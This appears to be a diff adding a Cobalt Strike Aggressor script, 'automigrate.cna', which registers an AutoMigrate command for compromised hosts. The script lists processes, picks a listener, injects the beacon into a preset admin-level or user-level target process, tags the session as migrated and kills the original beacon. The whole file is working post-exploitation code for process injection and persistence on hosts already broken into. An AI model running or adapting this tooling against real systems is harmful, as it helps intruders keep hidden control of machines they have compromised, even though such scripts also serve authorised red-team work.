@@ -1,0 +1,131 @@
+# AutoMigrate
+# Auto migrate beacon to new process
+
+println("\tLoading automigrate.cna");
+
+# Command Register
+beacon_command_register("AutoMigrate", "Auto migrate beacon to new globally defined process",
+	"Syntax: AutoMigrate");
+
+alias AutoMigrate {
+    local('$args');
+    $args = $0;
+
+    blog($1, "\c8AutoMigrate - Auto migrating beacon to new process...");
+    bps($1, &automigrate);
+}
+
+# register script command
+command showMigratedBeacons {
+    local('$entry $key $value');
+    foreach $entry (%g_migratedBeacons) {
+        println($entry);
+    }
+}
+
+sub automigrate {
+
+    local('$line $found');
+    @results = split("\n", ["$2" trim]);
+
+    if ($1 in %g_migratedBeacons) { # Already migrated
+        blog($1, "\c8AutoMigrate - Already migrated. Skipping migration...");
+    } else {
+
+        local('$listener');
+        local('$current_listener');
+        if (beacon_info($1, "pbid") eq "") { # Not SMB
+            foreach $listener (listeners_local()) {
+                if (listener_info($listener, "payload") ne "windows/beacon_smb/bind_pipe") {
+                    #println($listener);
+                    $current_listener = $listener;
+                }
+            }
+        } else {
+            foreach $listener (listeners_local()) {
+                if (listener_info($listener, "payload") eq "windows/beacon_smb/bind_pipe") {
+                    #println($listener);
+                    $current_listener = $listener;
+                }
+            }
+        }
+
+        # Admin Level
+        if (-isadmin $1) {
+
+            foreach $line (@results) {
+                @l = split('\t',$line);
+                $processName = @l[0]; # Process Name
+                $parentPID = @l[1];
+                $PID = @l[2]; # PID to migrate to
+                $arch = @l[3]; # Architecture
+                $user = @l[4]; # Process user
+                $session = @l[5]; # Session
+
+                if ($found ne true) {
+                    if ($g_adminMigrationBin isin $line) {
+                        $found = true;
+                        # Check if running in admin process
+                        if (beacon_info($1,"pid") !eq $PID) { # Dont migrate to itself
+                            # Make sure the current process has access to target process 
+                            #if ($session eq "1") {
+
+                                println('Migrating Beacon ' . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_adminMigrationBin . " PID: " . $PID);
+                                blog($1, "\c8AutoMigrate - Migrating Beacon " . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_adminMigrationBin . " PID: " . $PID);
+                                #bgetprivs($1);
+                                binject($1,$PID,$current_listener,$arch);
+                                bnote($1,"**MIGRATED** " . formatDate("yyyy.MM.dd_HH:mm:ss z") . "; " . beacon_info($1, 'note'));
+                                bexit($1);
+                            #} else {
+                            #    println('Can not migrate. Target process is in a different session ' . $1 . " PID: " . beacon_info($1,"pid"));
+                            #    blog($1, "\c8AutoMigrate - Can not migrate. Target Process is in a different session " . $1 . " PID: " . beacon_info($1,"pid"));
+                            #}
+
+                        } else {
+                            println('Already Migrated. '  . $1 . " PID: " . beacon_info($1,"pid"));
+                            blog($1, "\c8AutoMigrate - Already Migrated. "  . $1 . " PID: " . beacon_info($1,"pid"));
+                        }
+                    }
+                }
+
+            }
+            # Add to migrated beacon list
+            %g_migratedBeacons[$1] = $1;
+
+            } else { # User Level
+
+            foreach $line (@results) {
+                @l = split('\t',$line);
+                $processName = @l[0]; # Process Name
+                $parentPID = @l[1];
+                $PID = @l[2]; # PID to migrate to
+                $arch = @l[3]; # Architecture
+                $user = @l[4]; # Process user
+                $session = @l[5]; # Session
+
+                if ($found ne true) {
+                    if ($g_userMigrationBin isin $line) {
+                        $found = true;
+                        
+                        # Check if running in admin process
+                        if (beacon_info($1,"pid") !eq $PID) { # Dont migrate to itself
+
+                            println('Migrating Beacon ' . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_userMigrationBin . " PID: " . $PID);
+                            blog($1, "\c8AutoMigrate - Migrating Beacon " . $1 . " PID: " . beacon_info($1,"pid") . " to " . $g_userMigrationBin . " PID: " . $PID);
+                            binject($1,$PID,$current_listener,$arch);
+                            bnote($1,"**MIGRATED** " . formatDate("yyyy.MM.dd 'at' HH:mm:ss z") . "; " . beacon_info($1, 'note'));
+                            bexit($1);
+
+                        } else {
+                            println('Already Migrated. '  . $1 . " PID: " . beacon_info($1,"pid"));
+                            blog($1, "\c8AutoMigrate - Already Migrated. "  . $1 . " PID: " . beacon_info($1,"pid"));
+
+                        }
+                    }
+                }
+            }
+            # Add to Migrated list
+            %g_migratedBeacons[$1] = $1;
+        }
+    }
+}
